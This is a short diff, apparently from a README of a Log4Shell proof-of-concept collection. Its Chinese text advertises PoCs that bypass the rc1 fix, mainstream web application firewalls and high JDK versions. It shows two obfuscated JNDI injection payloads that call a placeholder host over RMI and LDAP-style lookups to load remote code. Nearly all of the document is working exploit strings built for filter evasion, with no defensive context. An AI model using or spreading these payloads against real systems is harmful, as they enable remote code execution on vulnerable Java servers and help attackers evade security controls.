@@ -3,7 +3,7 @@
 
 添加了绕过rc1的poc
 
-也同时能绕过常见主流waf拦截的poc
+也同时能绕过常见主流waf拦截的poc，还有高版本jdk绕过
 ```
 ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
 ${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
